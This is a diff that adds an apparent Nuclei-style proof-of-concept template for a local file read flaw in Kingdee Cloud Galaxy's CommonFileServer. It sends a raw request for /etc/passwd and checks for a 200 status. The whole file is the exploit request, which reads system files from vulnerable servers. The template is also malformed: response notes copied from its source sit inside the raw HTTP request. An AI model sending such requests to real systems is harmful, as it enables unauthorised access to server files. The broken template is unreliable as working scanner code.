@@ -1,0 +1,37 @@
+id: poc-asn5rc7dxa2mrx01
+info:
+  name: 金蝶云星空 CommonFileServer linux文件读取
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/asn5rc7dxa2mrx01'
+  tags: lfi,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: asn5rc7dxa2mrx01
+    fofa: 暂无
+http:
+- raw:
+  - 'GET /CommonFileServer/etc/passwd HTTP/1.1
+
+
+    Connection: close
+
+
+    # 响应代码特征
+
+    200
+
+
+    # 响应内容特征
+
+    root
+
+
+    # 上传文件定位
+
+    暂无'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
